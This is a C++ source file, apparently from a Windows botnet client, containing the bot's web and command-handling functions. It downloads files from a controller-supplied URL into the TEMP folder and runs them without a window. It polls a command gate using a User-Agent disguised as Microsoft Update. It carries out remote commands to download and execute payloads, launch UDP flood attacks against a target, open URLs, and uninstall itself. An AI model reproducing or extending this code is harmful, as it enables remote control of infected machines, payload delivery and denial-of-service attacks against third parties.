#include <Windows.h>
#include <stdio.h>
#include <wchar.h> /* FILE, _wfopen, etc */
#include <time.h>

#include "UdpFlood.h"
#include "SocketClass.h"
#include "Utils.h"
#include "InstallUtil.h"


namespace Web {


BOOL parseUrl(char* url, char *host, size_t host_len) {
	char http[] = {'h','t','t','p',':','/','/', 0};
	if(!strstr(url, http)) {
		// not a url.
		return false;
	}



	char *url_host = url + 7;
	if(!strstr(url_host, "/")) {
		memcpy(host, url_host, strlen(url_host));
	} else {
		int len = strstr(url_host, "/") - url_host;
		memcpy(host, url_host, len);
	}

	return true;
}
BOOL downloadFile(char *url, WCHAR *path) {

	WCHAR ENVOR = NULL, 
					MeTo[MAX_PATH],
					fsource[MAX_PATH];

	ENVOR = GetEnvironmentVariableW(L"TEMP", MeTo, MAX_PATH);
	wsprintfW( MeTo, L"%s\\%s", MeTo, path);

	FILE *file = _wfopen(MeTo, L"wb+");
	if(file == NULL) {
		// Couldn't open file for writing.
		return false;
	}

	char host[512] = "";
	if(!parseUrl(url, host, sizeof(host))) {
		// Couldn't parse url.
		return false;
	}

	pSocket socket;
	if(!socket.connect(host, 80)) {
		// Couldn't connect to webhost.
		return false;
	}

	char *payload_format =
		"GET %s HTTP/1.1" "\r\n"
		"Host: %s" "\r\n"
		"Connection: close" "\r\n"
		"\r\n"
		"\r\n";
	char payload[1024];
	wsprintfA(payload, payload_format,  url, host);
	if(socket.send(payload, strlen(payload)) == SOCKET_ERROR) {
		return false;
	}

	char buffer[1024];
	int size;

	if((size = socket.recv(buffer, sizeof(buffer))) == SOCKET_ERROR) {
		return false;
	}

	char *initialData;
	if(!(initialData = strstr(buffer, "\r\n\r\n"))) {
		// Invalid response.
		return false;
	}
	initialData += 4;

	size -= initialData - buffer;
	fwrite(initialData, 1, size, file);

	while((size = socket.recv(buffer, sizeof(buffer))) != SOCKET_ERROR && size > 0) {
		fwrite(buffer, 1, size, file);
	}
	fclose(file);
	HANDLE hTmpProcess = NULL;
	HANDLE hTmpThread  = NULL;
	BOOL ret = RunFileEx( MeTo, CREATE_NO_WINDOW, &hTmpProcess, &hTmpThread );
	if(ret) {
		return true;
	} else
		return false;
	}
BOOL CommandHandler(char* host, char* gate, char* data) {
	pSocket socket;
	if(!socket.connect(host, 80)) {
	return false;
	}	
	char *payload_format =
		"POST %s HTTP/1.0" "\r\n"
		"Host: %s" "\r\n"
		"Connection: close" "\r\n"
		"User-Agent: update.microsoft.com" "\r\n"
		"Content-type: application/x-www-form-urlencoded" "\r\n"
		"Content-Length: %u" "\r\n"
		"\r\n"
		"%s"
		"\r\n"
		"\r\n";
		char payload[1024];
		wsprintfA(payload, payload_format, gate, host, strlen(data), data);
		//MessageBoxA(0, payload, 0, 0);
		if(socket.send(payload, sizeof(payload)) == SOCKET_ERROR) {
		return false;
	}

	char buffer[1024] = "";
	int size;
	
	if((size = socket.recv(buffer, sizeof(buffer))) == SOCKET_ERROR) {
		return false;
	}
		WCHAR *tempbuf = (WCHAR*)malloc(2049 * 2);
		WCHAR *header_buff = (WCHAR*)malloc(2049 * 2);
        while((size = socket.recv(buffer, sizeof(buffer))) != SOCKET_ERROR && size > 0) {
		}
		mbstowcs(header_buff, buffer, 2049);
		for(int i = 0; header_buff[i]!=0; ++i)
	     {
		   if((header_buff[i]=='\r')&&(header_buff[i+1]=='\n') &&(header_buff[i+2]=='\r')&&(header_buff[i+3]=='\n')) {
				tempbuf = &header_buff[i] + 4;
					break;
			}
	     }
	if(lstrcmpW(tempbuf, L"") == 0) 
		return 0; //nothing to do
	
	//command parser
	WCHAR* cmdstrW = tempbuf;
	WCHAR* tokenW[128] = { 0 };
	WCHAR* tokxW = wcstok(cmdstrW, L" ");
	int index = 0;

	do
	{
		tokenW[index] = (WCHAR*)malloc(128);
		lstrcpyW(tokenW[index], tokxW);
		index++;
	}
	while(tokxW = wcstok(NULL, L" "));
	if(tokenW[0] != NULL && !wcscmp(tokenW[0], L"x0")) //UPDATE
	{ 
		Web::downloadFile(ToAnsi(tokenW[1]), tokenW[2]);
		deletebot();
	}
	else if(tokenW[0] != NULL && !wcscmp(tokenW[0], L"x1")) //DOWNLOAD
	{   
		Web::downloadFile(ToAnsi(tokenW[1]), tokenW[2]);
	}
	else if(tokenW[0] != NULL && !wcscmp(tokenW[0], L"x2")) //UDP
	{   
		//http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html
		int port = _wtoi(tokenW[2]);
		if(port == 0) {
			srand (time(NULL));
			port = rand()%6000;
		}
		int deadline = _wtoi(tokenW[3]);
		udpflood(ToAnsi(tokenW[1]), port, 1000, 1024, 10, 1000 * deadline);
	}
	else if(tokenW[0] != NULL && !wcscmp(tokenW[0], L"x4")) //Webvisit
	{  
		WCHAR szParams[260];
		lstrcpyW(szParams, L"url.dll,FileProtocolHandler ");
		lstrcatW(szParams, tokenW[1]);
		ShellExecuteW(NULL, L"open", L"rundll32.exe", szParams,NULL,SW_SHOWNORMAL);
	}
	else if(tokenW[0] != NULL && !wcscmp(tokenW[0], L"x5")) //Uninstall
	{   
		deletebot();
	}
  }
}